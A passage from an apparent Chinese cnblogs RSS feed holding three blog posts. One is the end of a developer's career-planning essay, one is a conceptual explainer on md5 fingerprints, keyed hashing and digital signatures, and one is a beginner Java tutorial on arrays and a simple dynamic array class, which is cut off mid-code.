&lt;p&gt;　　紧接着，12年到了我现在这家公司，刚来的时候只有6个人，开始实际上还是没有进入状态，而且对当时直线很看不惯（总是觉得这不好那不好的，都不好为啥不撤退在这赖着干啥），现在回想太年轻了。后来公司开展新业务，急需快速的搭建功能，对于善于“搬砖”的我意识到，机会来了。在那个技术氛围还相对不浓厚的时候，较快的开发速度加上彻夜加班的忙碌，奋斗了3年，业务上带领一个10个人的小团队为公司运营着一个年收300万左右的信息化系统，个人上也成熟了许多。这里说一点题外话，国内目前大型非科技企业对于技术的认知和要求会弱很多，相较于技术他们更在意成本和时间，这也是我现在感觉到最大的瓶颈。（中间还有一个关于团队的小插曲，对我影响很大，若有人感兴趣的话再聊。）&lt;/p&gt;
&lt;p&gt;　　慢慢在这个公司一直待到现在，管理着一个30多人的团队，也为公司培养了需求中流砥柱，职位上也从项目经理向总监方向提升，公司规模也从起初的6人发展到现在130多人。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、为何写博客？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　写博客是为了记录自己学习的点滴，另外也希望在自己积累的过程中有一个平台将自己呈现出来，说不定有1/1000000000的几率可以将自己在这个市场中被人所关注，也可以让自己以后的路越走越宽。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、未来的规划？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　&lt;span&gt;　1）不继续做.NET？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　.NET做了5年，经历了由盛到衰，现在自己的能力大概就是像ABP这些框架拿过来能看明白其中的原理，识别出其中的组件这样，知识面并不是很广，但对技术的理解和计算机思维培养的不错，新的技术通过学习上手也不难。&lt;/p&gt;
&lt;p&gt;　　接下来的规划考虑了很久，首先是要不要继续在高级编程语言上发展？&lt;/p&gt;
&lt;p&gt;　　　　我觉得先不要，原因是：&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;strong&gt;第一、&lt;/strong&gt;高级编程语言总是会建立在某个或开原或闭源或免费或收费的服务商之上，所谓“高级”就是提供商对底层知识的封装和集成，我从这个角度理解高级语言总是会被热捧或被冷漠，因为其有一套封装好的底层支持库。不管这个库是采用什么模式、什么语言风格、什么技术，终归有他的长处和他的短处，总是会有所限制。知识面广可能会对垃圾回收或者缓存处理机制有深刻的理解，可这些理解却又是建立在这套基础库之上，有一天这个语言不在时兴，我又会受到挤压，所以我断定这条路不是长远的道路。   &lt;/p&gt;
&lt;p&gt;　　　　　　&lt;strong&gt;第二、&lt;/strong&gt;高级编程语言迭代太快，不说各种语言，就说一个.NET每一个大版本的升级又有多少API和数据结构变更的血和泪，又有多少兼容性和环境冲突的血和泪。如果加上多个语言，我的天，那真身无尽的浩劫。&lt;/p&gt;
&lt;p&gt;　　　　　　&lt;strong&gt;第三、&lt;/strong&gt;只掌握高级编程语言在国内应用场景相对固化，这个引入一个问题，设计出高级程序语言目的是什么？ 我的理解是抽象和封装底层，让开发更加方便和快捷。  为什么要让开发更加方便快捷？因为我们要来造轮子、造工具、造产值，我们需要的是效率。一个巨型系统需要写核心技术实现的可能只占团队人数的10%？占整个项目工作量的20%？更多的还是需要搬砖的人，什么搬砖？就是按固有的模式去把功能实现过程写出来。内存管理？底层有了，都实现了。数据结构？虚拟类、抽象类、接口……够用了。硬件对接，Excuse Me?&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;综合上述思考，在某一个特定语言领域取得成绩需要投入大量的时间精力，然而得到的成果却有十分大的局限性和不稳定性，受影响的因素太多，很可能会变成现在的VB程序员。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　   　&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;四、新的方向：底层+电路+硬件+网络+高级编程语言&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　&lt;strong&gt;&lt;span&gt;　1）为自己新方向的考虑做如下的定义和思考：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　   前瞻思考：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　目前最火的技术领域：&lt;strong&gt;AI、3D打印、IoT、区块链、大数据、自动驾驶&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　目前这些技术领域都在从两大入手：&lt;strong&gt;算法、硬件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　&lt;strong&gt;为什么？——我的思考：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　　1、从零几年开始，国内开始企业信息化的大潮，就此诞生出无数的弄潮儿金蝶、用友……数不胜数，然而时至今日，大海早已变红，随着信息化市场的成熟发展变得越来越慢，效益也变得越来越难，市场上的竞争对手也越来越多，技术也变得越来越成熟。在需求的催化下、大型技术企业的布局需求、设备成本越来越低、新技术突破、资本涌入信息技术的催化之下原来不可能的事变得可能，原来不敢想的事儿现在敢想。&lt;/p&gt;
&lt;p&gt;　　　　　　　2、本身整个发展也遵循着：基础设施层面——基础应用层面——高级应用层面    轨道发展，网络通信相关的建设、基础设备技术的突破、最小企事业个人单位的信息化普及率的提升、集成化信息产品的普及的盛行也都酝酿着这些高级技术应用的诞生。&lt;/p&gt;
&lt;p&gt;　　　　　　　3、整个市场大环境的变化，更加开放，更加进步，更容易接受新生事物，这些事情也在不断的让更多更新、更好的想法在市场上得到认证。&lt;/p&gt;
&lt;p&gt;　　　　　　　4、资本在驱动让市场更加活跃，更加敢于试错，重金之下必有勇夫，在资本的驱动下国内电商/信息化市场异常的活跃。（当然也有不少泡沫，总体上来说比房地产小多了吧。）&lt;/p&gt;
&lt;p&gt;　　　　　　   5、上述的发展让更多的资源投入到这个行业中，就好像烧开的热水，下面的升上来，上面的往两边去。&lt;/p&gt;
&lt;p&gt;　　　　　　　&lt;span&gt;现在这些名词总是单独被提起，但很快他们将串联在一起形成一波新的基础设施的升级和迭代，这将会成为新的一波技术红利。而在他们基础之上将会百花齐放，诞生出更多的新商业应用和技术应用，不断的迭代和升级。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　   我觉得这样真的很好，我相信，&lt;span&gt;未来很快就会一种新的力量打破现在的格局，就是真的是为了改变世界而做事的人不断的涌现上来、受到每个人的支持和青睐，提供给大家像苹果4一样跨时代的产品，将大家的生活进行一次又一次的革命&lt;/span&gt;。十年后可能将会是与普通大众关系最密切的技术更新最频发的时代，技术会快速的改变你的生活，你的习惯和你一切的一切。&lt;/p&gt;
&lt;p&gt;　　　　　　　 从个人角度考虑，我试想若是以后对电路基础、硬件、网络、高级编程语言都有深刻认识的人才是真正的高级人才，对通体掌握和熟悉的人在技术管理上才有前瞻性，才有更高的统御能力；作为普通技术人员来说，未来的市场发展一家独大的可能性低之又低，因为产品的技术栈会变得很大，更加依赖于整个供应链的支持和管理，供应链会被细分的更细。加工制造型的不太了解，但在技术研发领域需要更多想小微团队深钻某个技术领域或某个技术应用，也就是未来的高竞争力企业的人数反而不一定会很多，但技术资产一定是最丰富的。在我假想的这个前提下，我希望我有条件有能力加入到一个这样的团队中或在一个企业的技术研发团队中有一席之地，有一言之地。&lt;/p&gt;

&lt;p&gt;　　  &lt;strong&gt;&lt;span&gt;高级编程语言——》高级软件设计&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　　高级编程语言除了效率上的提升带来更大的好处是“面向对象”，从更高维度对编码工作进行了抽象，更好的将程序思维和业务思维进行结合。同时，衍生出不同的设计模式、不同的架构，从技术层面解决对象关系/认知上与技术上的冲突，最终得到一个功能完备、设计合理、维护简单的软件产品或者是代码包。我认为这才是高级编程语言所带来的最大的好处。 至于什么语法糖、声明方式、自动实现什么的都是锦上添花的东西、提升效率的工具，真正编程思想的提升和与现实的融会贯通才是最大的优势。&lt;/p&gt;
&lt;p&gt;　　　　　　　所以，未来在高级语言上的规划从涉猎“新技术”（新轮子）转向高级软件设计方向，更好的理解和领悟如何设计出一个更加完美的软件工程，如何将业务思想与编码更好的结合，如何设计出可以更加适应变化的软件产品。&lt;/p&gt;

&lt;p&gt;　　  &lt;strong&gt;&lt;span&gt;底层、电路、硬件、网络通信&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　　　　与第一条相同，这或将成为未来知识体系中的基础知识。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;总的来说涉及知识面很多、很广；学海无涯苦作舟，若想做条舟将这片大海都翱翔一遍估计此生时间不够用，所以对于技术学习做以下定义：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　　　&lt;strong&gt;1）涉及到科研、计算、推导领域的知识内容了解即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　数学公式、推导过程、计算公式这些了解即可，重要的公式背过。因为整个技术发展有一个重要的底层基础就是基础工作的自动化和智能化，现在有许多的软件可以让你快速的进行电路设计，模拟电路参数，可以让你不用电流表就将电路每个环节的参数模拟清楚，所以这些内容了解如何应用即可。&lt;/p&gt;

&lt;p&gt;　　　　&lt;strong&gt;2）涉及到计算机底层知识必须熟练掌握&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　包括：二进制、汇编、编译链接、信号控制、ECF、虚拟内存、网络编程等内容必须熟练掌握，所谓熟练掌握即书本上的知识要了解，也能结合实际案例自己动手做出样例，能反编译看懂代码，对不同操作系统的特性和文件结构进行掌握。&lt;/p&gt;

&lt;p&gt;　　　　&lt;strong&gt;3）涉及到的知识点必须可以动手实践并阶段性输出汇总性的成果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　成果包括：博客、产品、硬件模型、代码等内容&lt;/p&gt;

&lt;p&gt;　　　　&lt;strong&gt;4）数学和英语知识必须提升&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　上学的时候没有好好学，但底子没有太差，对于离散数学、微积分方面还要深造，英语持续背单词，目的是能看懂国外的文献作品不断汲取知识。&lt;/p&gt;

&lt;p&gt;　　　　5）后续想到什么再补充&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;五、时间上的规划&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　今年26岁，再给自己2-3年的时间，将上述内容完全掌握并选择合适的证书考出来。&lt;/p&gt;
&lt;p&gt;　　　　&lt;strong&gt;&lt;span&gt;目前的行动：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　已购买图书十册，其中已粗度两册，精细阅读两册，理论结合实际1册，正在精度1.5册。&lt;/p&gt;
&lt;p&gt;　　　　此贴立FLAG，这些书一年之内学完，部分章节粗度后续备查，部分章节细读理论结合实际掌握清楚。&lt;/p&gt;
&lt;p&gt;　　　　这将作为我未来五年的人生导向，与工作尽量协作避免冲突。&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1126312/201808/1126312-20180806224119915-676112459.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



</description>
<pubDate>Mon, 06 Aug 2018 14:50:00 +0000</pubDate>
<dc:creator>炎寒</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiayongming/p/9434054.html</dc:identifier>
</item>
<item>
<title>网络传输与加密 (2) - kid551</title>
<link>http://www.cnblogs.com/kid551/p/9434055.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kid551/p/9434055.html</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/kid551/p/9409861.html&quot; target=&quot;_blank&quot;&gt;网络传输与加密&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;让我们先回顾一下上次的验证过程，如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/672506/201808/672506-20180806225149467-1667267795.png&quot; alt=&quot;&quot; width=&quot;683&quot; height=&quot;330&quot;/&gt;&lt;/p&gt;

&lt;p&gt;有了“原信息”和它对应的“md5签名字符串”，我们就可以做最基本的信息验证：通过md5签名字符串的一致性，来保障我们收到的信息没有受到更改。&lt;/p&gt;
&lt;p&gt;P.S.：由于签名signature在后续文章中会另有所指，为区分md5签名字符串，我们将md5签名字符串的叫法，更改为&lt;strong&gt;md5指纹字符串&lt;/strong&gt;。意思同签名是一样的，就是A之所以是A的证据、特征，可以用签名来表示，也可以用指纹来表示。这里，我们开始将md5字符串对应的这个特征，称作md5指纹。&lt;/p&gt;
&lt;p&gt;但一个容易发现的漏洞是，如果“原信息”和“md5指纹字符串”同时被修改了该怎么办？原信息被代提成了伪信息，而md5指纹字符串也被替换成了伪信息所生成的md5码，这时候，原有的验证过程都可以走通，根本无法发现信息被修改了或者替换了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/672506/201808/672506-20180806225226680-101466601.png&quot; alt=&quot;&quot; width=&quot;672&quot; height=&quot;332&quot;/&gt;&lt;/p&gt;

&lt;p&gt;为了解决这个问题，在工业实践中便会将验证和加密进行组合使用。除了单纯的组合，还会引入一些基本的小技巧。&lt;/p&gt;
&lt;p&gt;例如，因为md5的验证算法是公开的，所以很容易生成一份信息的md5指纹字符串，从而对原信息进行伪造。那么，可以不可以让人无法或者说难于伪造这份信息的md5指纹字符串呢？&lt;/p&gt;
&lt;p&gt;一个小技巧是：并不提供原信息的md5验证码，而是提供“原信息+a key”的md5指纹字符串：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/672506/201808/672506-20180806225309929-634466494.png&quot; alt=&quot;&quot; width=&quot;681&quot; height=&quot;560&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这个key，就是一串如“2d2316235b41924ac7c4b194661d2984”这样的随机字符串，它由“发信人”和“收信人”分别单独保存。&lt;/p&gt;
&lt;p&gt;这时候，我们的验证流程就变成了：&lt;/p&gt;
&lt;ul class=&quot;list-paddingleft-2&quot; readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;发件人将“原信息”和“key”一起打包，生成一个md5指纹字符串。再将原信息和md5指纹字符串发送出去。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;收件人收到信息后，将“接受信息”和“key”一起打包，生成一个md5字符串，再与接收到的md5字符串比较，看它们是否一致。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;在这样的情况下，即便是原信息和md5字符串同时被修改了，但因为伪造者并不知道这个md5字符串是在原有信息的基础上，增加了什么样的一个key字符串来生成的，他就几乎不可能提供一个“原信息+key”的md5字符串。因为他无法逆向推导出那个key长成什么样。而这个“几乎不可能”，是由md5加密算法所保证的。&lt;/p&gt;
&lt;p&gt;另一种保障“原信息”和“md5指纹字符串”的方式，是直接考虑把md5验证码做加密。这种方式并不同上面的小技巧相冲突，事实上它完全可以和上面的技巧结合，构造出更安全的方式。但为了降低理解的困难程度，让我们先暂时抛开上面的小技巧，只是单纯地考虑“原信息”“md5指纹字符串”和“md5字符串加密”这三样东西。&lt;/p&gt;
&lt;p&gt;还是回到刚开头提到的核心想法，为什么仅有“原信息”和“md5指纹字符串”是不安全的？因为这两者的对应关系是由一个已知的算法连通的。之前的小技巧，是把这个用于连通的“已知”算法，通过一个私密的key，巧妙地把这个公开的“已知”算法变成了一个“未知”的算法，从而无法制造出对应的md5指纹字符串。&lt;/p&gt;
&lt;p&gt;所以，这里的重点其实是，你没办法去伪造md5指纹字符串。&lt;/p&gt;
&lt;p&gt;基于这样的考虑，我们还可以用别的方式，让其他人依旧无法伪造出md5指纹字符串，例如，你根本就不知道这个md5指纹字符串长什么样！&lt;/p&gt;
&lt;p&gt;怎么做呢？那就是，我不再提供“原信息和md5指纹”的组合，而是提供“原信息”和“用私钥加密后的md5指纹”，也即是把md5指纹又做了一次乱码。&lt;/p&gt;
&lt;p&gt;你或许会问，加密了md5有什么用？不是照样可以直接把信息和md5指纹同时换掉吗？&lt;/p&gt;
&lt;p&gt;没错，你是可以这样做，但是，这时候作为接收方来讲，他的接受验证过程，已经变成了：&lt;/p&gt;
&lt;ol class=&quot;list-paddingleft-2&quot; readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;用公钥解密，得到一串字符串，当作原信息的md5指纹。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将md5函数作用在接收到的信息，得到一个本地生成的md5指纹。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将本地生成的md5指纹和原md5指纹做比较。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;所以，即便是你替换了原信息和md5指纹，但如果这个md5指纹没有被私钥加密过，那么按照上述步骤，通过公钥解密出来的字符串，便不会是相应的md5指纹，而是一串不知所云的乱码。从而，你必须通过私钥加密，才可以伪造md5指纹来欺骗接收方。&lt;/p&gt;
&lt;p&gt;这个被加密了的md5指纹，也被称作数字签名（digital signature）。&lt;/p&gt;
&lt;p&gt;此时，所有的安全问题，便落在了这个“私钥”上。只要它不被窃取，你发送的信息便是安全的、可以得到验证的。&lt;/p&gt;
&lt;p&gt;那么，如何保证你的“私钥”不被窃取呢？使用网络传输吗？万一在半路上被劫走篡改怎么办？基于此，更为安全妥当的办法，便是使用物理传输，直接在现实中，手把手的将秘钥给发送方。&lt;/p&gt;
&lt;p&gt;我们在生活中遇到过这样的情况吗？当然！还记得银行的网银盾么？为什么银行要煞费苦心地给你一个U盘？因为里面存放着你用来加密的私钥啊！（以及之后我们会谈到的证书）相比于通过网络连接将私钥发放给客户，直接通过现实中的实物来传递私钥，是更加可靠的。&lt;/p&gt;





&lt;p&gt;&lt;strong&gt;近期回顾&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;《&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI5MDMyMTEwNw==&amp;amp;mid=2247484405&amp;amp;idx=1&amp;amp;sn=3883a0c8e3fe64edbde89f016dcfa76f&amp;amp;chksm=ec20e449db576d5f0e4d91af261b301518e8db03703e312e6928d3349a3a47292b34931af44f&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot;&gt;不是不屑，而是自保&lt;/a&gt;》&lt;br/&gt;《&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI5MDMyMTEwNw==&amp;amp;mid=2247484401&amp;amp;idx=1&amp;amp;sn=20a47961a9276d16bfe22e6c5dc344a5&amp;amp;chksm=ec20e44ddb576d5bbc43c038e4cbcc9ca5058c176eb990a23c7f3a6e904fa8f7372a8c5b141b&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot;&gt;网络传输与加密&lt;/a&gt;》&lt;br/&gt;《&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI5MDMyMTEwNw==&amp;amp;mid=2247484395&amp;amp;idx=1&amp;amp;sn=c771c70a46a0d6839d3095035a148084&amp;amp;chksm=ec20e457db576d41f711af590b530043ed709da5e9ef99e360200ddf1afdee12a5a6b4c9dd4a&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot;&gt;为什么需要提前撰写Spec文档&lt;/a&gt;》&lt;/p&gt;

&lt;h2&gt; &lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;如果你喜欢我的文章或分享，请长按下面的二维码关注我的微信公众号，谢谢！&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/672506/201808/672506-20180806224857049-1573969108.jpg&quot; alt=&quot;&quot; width=&quot;688&quot; height=&quot;344&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;h3&gt;   &lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;更多信息交流和观点分享，可加入知识星球：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/672506/201808/672506-20180806224924884-705487720.png&quot; alt=&quot;&quot; width=&quot;676&quot; height=&quot;417&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 14:50:00 +0000</pubDate>
<dc:creator>kid551</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kid551/p/9434055.html</dc:identifier>
</item>
<item>
<title>数据结构(一)_数组 - 阳光温暖</title>
<link>http://www.cnblogs.com/zhenghengbin/p/9434012.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhenghengbin/p/9434012.html</guid>
<description>&lt;h3 id=&quot;数组基本知识&quot;&gt;数组基本知识&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;数组对于每一门编程语言来说都是重要的数据结构之一，当然不同语言对数组的实现及处理也不尽相同。&lt;br/&gt;Java语言中提供的数组是用来存储固定大小的同类型元素。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://img.mukewang.com/537074a400017cd905290196.jpg&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Demo1 {
    public static void main(String[] args) {

        // 定义一个数组，保存五名学生的成绩
        int[] scores = { 78, 93, 97, 84, 63 };

        // 输出数组中的第二个成绩
        System.out.println(&quot;数组中的第2个成绩为：&quot; + scores[1]);
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;数组的基本使用&quot;&gt;数组的基本使用&lt;/h4&gt;
&lt;p&gt;1、 声明数组&lt;/p&gt;
&lt;p&gt;语法： 数据类型[ ] 数组名；&lt;/p&gt;
&lt;p&gt;或者 数据类型 数组名[ ]；&lt;/p&gt;
&lt;p&gt;其中，数组名可以是任意合法的变量名，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.mukewang.com/5371e91d000147e903790167.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2、 分配空间&lt;/p&gt;
&lt;p&gt;简单地说，就是指定数组中最多可存储多少个元素&lt;/p&gt;
&lt;p&gt;语法： 数组名 = new 数据类型 [ 数组长度 ];&lt;/p&gt;
&lt;p&gt;其中，数组长度就是数组中能存放元素的个数，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.mukewang.com/5371ecc10001c97804260171.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;话说，我们也可以将上面的两个步骤合并，在声明数组的同时为它分配空间，如：&lt;br/&gt;&lt;img src=&quot;http://img.mukewang.com/5371ed4200012bee03590033.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3、 赋值&lt;/p&gt;
&lt;p&gt;分配空间后就可以向数组中放数据了，数组中元素都是通过下标来访问的，例如向 scores 数组中存放学生成绩&lt;br/&gt;&lt;img src=&quot;http://img.mukewang.com/5371ed9f0001accb02100053.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4、 处理数组中数据&lt;/p&gt;
&lt;p&gt;我们可以对赋值后的数组进行操作和处理，如获取并输出数组中元素的值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.mukewang.com/5371eec50001332707460043.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在 Java 中还提供了另外一种直接创建数组的方式，它将声明数组、分配空间和赋值合并完成，如&lt;br/&gt;&lt;img src=&quot;http://img.mukewang.com/5371ee8b000101aa04540056.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;它等价于：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.mukewang.com/5371ef0f0001528c04830059.jpg&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;使用循环操作-java-中的数组&quot;&gt;使用循环操作 Java 中的数组&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public static void main(String[] args) {

        // 定义一个数组，保存五名学生的成绩
        int[] scores = { 78, 93, 97, 84, 63 };

        //for循环打印
        for (int i = 0; i &amp;lt; scores.length; i++) {
            System.out.print(scores[i]+&quot;  &quot;);
        }
        System.out.println();
        //foreach打印
        //foreach是for语句的特殊简化版本，在遍历数组、集合时， foreach更简单便捷。
        //for(元素类型  变量：遍历对象){
        //执行的代码
        //}
        for (int i : scores) {
            System.out.print(i+&quot;  &quot;);
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;执行结果&lt;br/&gt;78 93 97 84 63&lt;br/&gt;78 93 97 84 63&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;编程练习&quot;&gt;编程练习&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;package com.zhb;

public class Demo1 {
    public static void main(String[] args) {

        int[] nums = new int[] { 61, 23, 4, 74, 13, 148, 20 };

        int max = nums[0]; // 假定最大值为数组中的第一个元素
        int min = nums[0]; // 假定最小值为数组中的第一个元素
        double sum = 0;// 累加值
        double avg = 0;// 平均值

        for (int i = 0; i &amp;lt; nums.length; i++) { // 循环遍历数组中的元素
            // 如果当前值大于max，则替换max的值

            if(nums[i]&amp;gt; max){
                max = nums[i];
            }

            // 如果当前值小于min，则替换min的值
            if(nums[i]&amp;lt; min){
                min = nums[i];
            }


            // 累加求和
            sum+=nums[i];

        }

        // 求平均值

        avg = sum/nums.length;
        System.out.println(&quot;数组中的最大值：&quot; + max);
        System.out.println(&quot;数组中的最小值：&quot; + min);
        System.out.println(&quot;数组中的平均值：&quot; + avg);
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;输出结果&lt;br/&gt;数组中的最大值：148&lt;br/&gt;数组中的最小值：4&lt;br/&gt;数组中的平均值：49.0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;使用-arrays-类操作-java-中的数组&quot;&gt;使用 Arrays 类操作 Java 中的数组&lt;/h4&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Arrays 类是 Java 中提供的一个工具类，在 java.util 包中。该类中包含了一些方法用来直接操作数组，比如可直接实现数组的排序、搜索等.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;package com.zhb;

import java.util.Arrays;

public class Demo1 {
    public static void main(String[] args) {

        // 定义一个字符串数组
        String[] hobbys = { &quot;sports&quot;, &quot;game&quot;, &quot;movie&quot; };
        
        // 使用Arrays类的sort()方法对数组进行排序
        Arrays.sort(hobbys);    
        
        // 使用Arrays类的toString()方法将数组转换为字符串并输出
        System.out.println( Arrays.toString(hobbys) );
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;执行结果&lt;br/&gt;[game, movie, sports]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;构建动态数组&quot;&gt;构建动态数组&lt;/h3&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;其实，这里就是类似模拟实现ArrayList类的实现。这里只是简化了部分。主要是代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;首先我们先构建一个int类型的动态数组&quot;&gt;首先我们先构建一个int类型的动态数组&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;这里默认容量为10和ArrayList一致，这也告诉我们ArrayList默认容量为10，其中阿里规约提到，使用集合时，要指定集合初始值大小&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;/**
 * 动态int数组
 *
 * @author: curry
 * @Date: 2018/8/2
 */
public class Array {

    private int[] data;

    private int size;

    /**
     * 构造函数。传入数组的容量capacity构造Array
     *
     * @param capacity
     */
    public Array(int capacity) {
        data = new int[capacity];
        size = 0;
    }

    /**
     * 无参构造函数，默认容量为10
     */
    public Array() {
        this(10);
    }

    /**
     * 获取数组中的元素个数
     *
     * @return
     */
    public int getSize() {
        return size;
    }

    /**
     * 获取数组容量
     *
     * @return
     */
    public int getCapacity() {
        return data.length;
    }

    /**
     * 返回数组是否为空
     *
     * @return
     */
    public boolean isEmpty() {
        return size == 0;
    }

    /**
     * 向数组最后添加元素
     *
     * @param e
     */
    public void addLast(int e) {
        add(size, e);
    }

    /**
     * 向数组最后增加一个元素
     *
     * @param e
     */
    public void addFirst(int e) {
        add(0, e);
    }

    /**
     * 向index位置增加元素e
     *
     * @param index
     * @param e
     */
    public void add(int index, int e) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt; size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        //判断容量是否超出
        if (size == data.length) {
            throw new IllegalArgumentException(&quot;Array is full&quot;);
        }

        //将index后面的值进行后移
        for (int i = size - 1; i &amp;gt;= index; i--) {
            data[i + 1] = data[i];
        }
        //赋值到index 位置
        data[index] = e;

        size++;

    }

    /**
     * 获取index索引位置的值
     *
     * @param index
     * @return
     */
    public int get(int index) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        return data[index];
    }

    public void set(int index, int e) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        data[index] = e;
    }

    /**
     * 查找数组中的是否有元素
     *
     * @param e
     * @return
     */
    public boolean contains(int e) {

        for (int i = 0; i &amp;lt; size; i++) {
            if (data[i] == e) {
                return true;
            }
        }

        return false;

    }

    /**
